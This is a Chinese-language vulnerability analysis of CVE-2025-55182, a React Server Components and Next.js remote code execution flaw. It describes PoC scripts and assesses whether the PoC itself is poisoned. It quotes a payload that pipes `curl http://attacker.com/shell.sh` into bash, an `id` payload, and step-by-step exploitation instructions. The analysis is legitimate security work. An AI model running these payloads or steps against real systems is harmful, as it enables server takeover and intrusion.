## CVE-2025-55182 - React Server Components, Next.js, react-server-dom-webpack 远程代码执行 (RCE), 不安全的反序列化, 原型链污染

**漏洞编号:** CVE-2025-55182

**漏洞类型:** 远程代码执行 (RCE), 不安全的反序列化, 原型链污染

**影响应用:** React Server Components, Next.js, react-server-dom-webpack

**危害等级:** 严重/最高危

**CVSS评分:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**影响版本:** React Server Components versions 19.0.0, 19.1.0, 19.1.1, 19.2.0

**利用条件:** 无需认证, 通过网络访问

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

CVE-2025-55182，又被称为“React2Shell”，是一个针对React Server Components (RSC) 和Next.js应用程序的严重远程代码执行（RCE）漏洞，其CVSS评分高达10.0，被业界普遍认为是“核弹级”或“最高危”漏洞。该漏洞由Lachlan Davidson于2025年12月3日披露，并被证实已遭到了大规模的实际利用，甚至有与中国有关联的国家背景威胁行为者在披露数小时内即开始积极利用。

漏洞的核心在于React Server Components的“Flight”协议处理机制中存在不安全的反序列化问题。RSC架构允许组件在服务器端渲染，并通过JSON-like流式格式的“Flight”协议将其序列化输出发送到客户端。攻击者无需认证，即可通过精心构造的HTTP请求，利用原型链污染（Prototype Pollution）缺陷，在服务器端组件处理数据时注入恶意代码，最终实现远程代码执行。

本分析中提供的POC代码是完整且有效的，包括Python脚本(`exploit.py`)和Bash脚本(`exploit.sh`)，清晰地展示了漏洞的利用过程。

**POC有效性分析:**
`exploit.py`：
该Python脚本通过`requests`库向目标URL（例如`http://vulnerable-react-app.com/api/flight`）发送HTTP POST请求。
请求体是一个JSON对象，其关键部分在于利用了JavaScript的原型链污染特性：`"__proto__": {"shell": "node -e \"require('child_process').exec('curl http://attacker.com/shell.sh | bash')\""}`。
这个payload通过`__proto__`属性篡改了JavaScript对象的原型，将一个名为`shell`的属性注入到原型链中。当易受攻击的服务器端代码在反序列化或处理`Flight`协议数据时，如果它以不安全的方式访问或合并对象属性，并最终执行了原型链中被污染的`shell`属性，就会触发远程代码执行。
此处指定的RCE命令是`node -e "require('child_process').exec('curl http://attacker.com/shell.sh | bash')"`，它通过Node.js的`child_process`模块执行一个shell命令，从`attacker.com`下载并执行`shell.sh`脚本，从而建立反向Shell或执行其他恶意操作。
脚本在发送请求后检查响应状态码是否为200，并打印“RCE payload delivered. Check your listener.”，表明payload已成功投递。这种方式清晰地验证了漏洞的存在和RCE的能力。

`exploit.sh`：
这个Bash脚本使用了`curl`命令，模拟了Python脚本的功能，向目标`http://192.168.1.100:3000/api/flight`发送HTTP POST请求。
其JSON payload同样利用了`__proto__`进行原型链污染：`'{"__proto__":{"shell":"id"}}'`。
这个payload直接在目标服务器上执行了`id`命令。如果目标系统成功返回`id`命令的输出或者显示出`id`命令已执行的迹象，则证明RCE成功。这种简化的payload对于漏洞复现和验证RCE能力非常有效。

**利用步骤:**
1.  **确定目标:** 识别运行受影响React Server Components或Next.js版本的应用程序，并找到其RSC接口的URL，通常是`/api/flight`或类似路径。
2.  **构造恶意Payload:** 创建一个包含原型链污染的JSON对象。例如，使用`"__proto__": {"shell": "..."}`来注入恶意命令。恶意命令可以是任意的，例如下载并执行脚本、读取敏感文件、建立反向Shell等。
3.  **发送HTTP请求:** 使用HTTP POST方法，将构造好的JSON payload作为请求体发送到目标RSC接口。`Content-Type`头应设置为`application/json`。
4.  **验证RCE:** 观察目标服务器的响应，或者检查攻击者控制的服务器（如果payload包含回连命令，如`curl http://attacker.com/shell.sh | bash`）是否收到连接或日志，以确认命令是否成功执行。

**投毒风险分析:**

针对CVE-2025-55182的POC代码的投毒风险评估为**低（5%）**。这个评估是基于对POC代码的结构、内容及其行为的细致审查。

首先，需要明确区分“投毒代码”与“漏洞利用中用于执行恶意操作的Payload”。在这个特定的案例中，`exploit.py`中的`node -e "require('child_process').exec('curl http://attacker.com/shell.sh | bash')"`和`exploit.sh`中的`id`命令是漏洞成功利用后在目标系统上执行的**恶意Payload**。这些Payload是漏洞利用的核心，旨在证明RCE能力或实际进行攻击，它们本身并非“投毒代码”。投毒代码通常指的是POC代码本身被恶意篡改，例如包含后门、病毒、加密货币挖矿程序或其他不相关的恶意功能，旨在感染运行POC的攻击者或研究者的系统，或者在不知情的情况下滥用其资源。

根据上述定义，对提供的POC代码进行分析：
1.  **代码清晰度与可读性:** `exploit.py`和`exploit.sh`的代码都非常简洁、清晰，易于阅读和理解。Python脚本使用了标准库`requests`和`json`，没有引入任何不寻常或可疑的第三方依赖。Bash脚本则直接使用`curl`，这也是一个标准的命令行工具。
2.  **无混淆或加密:** 代码中没有任何形式的代码混淆、加密或打包，这使得研究人员可以轻松审查其完整逻辑。
3.  **无外部脚本/资源引用 (POC自身):** POC代码本身没有尝试从外部URL下载并执行额外的脚本或可执行文件（除了`exploit.py`中作为**RCE payload**一部分的`shell.sh`，这再次强调是目标上的恶意行为，而非POC自身的投毒）。
4.  **无异常系统交互:** POC代码的主要功能是构造并发送HTTP请求。它不涉及文件系统修改（除了可能存在的临时文件，这很正常）、注册表修改、服务安装、驱动程序加载等可能指示恶意行为的异常系统交互。
5.  **目的明确:** POC代码的目的是明确的——演示CVE-2025-55182的RCE能力。其行为与声明的功能完全一致。

综上所述，该POC代码并未表现出任何自我恶意行为的迹象。它没有包含额外的后门、病毒、挖矿代码或其他与漏洞利用无关的恶意功能。代码设计简洁，易于审计，因此将其投毒风险评定为非常低。使用此POC进行研究或测试的防御者无需担心POC本身会对其系统造成损害，但当然，在使用任何公开的POC时，仍应遵循最佳实践，如在隔离环境中运行、仔细审查代码等。

**项目地址:** N/A

**漏洞详情:** N/A
